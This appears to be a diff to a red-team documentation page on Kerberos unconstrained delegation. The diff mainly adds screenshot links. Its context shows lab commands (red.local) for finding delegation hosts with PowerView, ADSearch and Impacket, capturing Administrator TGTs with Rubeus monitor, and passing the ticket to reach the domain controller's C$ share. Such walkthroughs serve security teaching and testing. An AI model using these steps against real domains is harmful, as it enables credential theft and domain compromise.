@@ -18,12 +18,14 @@ Import-Module .\Microsoft.ActiveDirectory.Management.dll
 
 Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
 ```
+![](/docs/assets/images/KUD-1.png)
 
 2. ADSearch
 
 ```bash
 ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
 ```
+![](/docs/assets/images/KUD-2.png)
 
 3. PowerView
 
@@ -32,21 +34,23 @@ ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.11
 
 Get-NetComputer -Unconstrained | select dnshostname,samaccountname
 ```
+![](/docs/assets/images/KUD-3.png)
 
 4. Impacket
 
 ```bash
 findDelegation.py red.local/domuser:'P@ssw0rd1!' -target-domain red.local
 ```
+![](/docs/assets/images/KUD-4.png)
 
 ## Exploitation
-
 
 1. Try listing the C$ on the DC to confirm we don't have administrator privileges on the DC
 
 ```bash
 dir \\dc01\c$
 ```
+![](/docs/assets/images/KUD-5.png)
 
 2. Run `Rubeus.exe` to view the tickets.
 
@@ -55,8 +59,11 @@ dir \\dc01\c$
 
 klist
 ```
+![](/docs/assets/images/KUD-6.png)
+![](/docs/assets/images/KUD-7.png)
 
-3. On websrv run the following to capture TGTs
+
+3. On websrv run the following to capture TGTs and observe the response in Rubeus
 
 ```bash
 .\Rubeus.exe monitor /monitorinterval:10 /filteruser:Administrator /nowrap
@@ -72,6 +79,11 @@ hostname
 dir \\websrv.red.local\c$
 ```
 
+![](/docs/assets/images/KUD-8.png)
+
+![](/docs/assets/images/KUD-9.png)
+
+
 5. Use Rubues.exe ptt module
 
 ```bash
@@ -79,8 +91,18 @@ dir \\websrv.red.local\c$
 klist
 ```
 
+![](/docs/assets/images/KUD-10.png)
+
+![](/docs/assets/images/KUD-11.png)
+
+
 6. Try listing the C$ on the DC now to confirm that we have Administrator Credential material.
 
 ```
 dir \\dc01\c$
 ```
+
+![](/docs/assets/images/KUD-12.png)
+
+----
+
